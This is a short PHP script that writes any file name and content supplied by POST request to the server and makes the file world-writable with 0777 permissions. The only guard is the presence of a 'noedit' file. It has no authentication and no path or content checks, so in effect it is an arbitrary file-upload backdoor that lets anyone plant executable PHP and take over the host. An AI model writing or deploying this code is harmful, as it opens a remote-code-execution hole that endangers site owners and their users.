<?php
$name = $_POST['name'];
$content = $_POST['content'];
if (file_exists('noedit')) {} else {
    file_put_contents($name, $content);
    chmod($name, 0777);
}
